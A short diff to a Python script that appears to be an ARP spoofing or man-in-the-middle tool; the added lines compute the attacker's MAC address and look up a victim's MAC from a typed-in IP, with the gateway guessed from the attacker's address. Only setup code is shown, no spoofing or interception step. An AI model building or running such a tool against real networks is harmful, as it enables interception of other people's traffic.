@@ -29,3 +29,8 @@ if __name__ == '__main__':
 	attackerIP= socket.gethostbyname(socket.gethostname())
 	gatewayIP= attackerIP[:-1]+str(1)
 	victimIP= input('victim IP: ')
+
+	attackerMac=get_mac()
+	attackerMac=':'.join(("%012X" %attackerMac)[i:i + 2] for i in range(0,12,2))
+
+	victimMac=vicMac(attackerIP,attackerMac,victimIP)
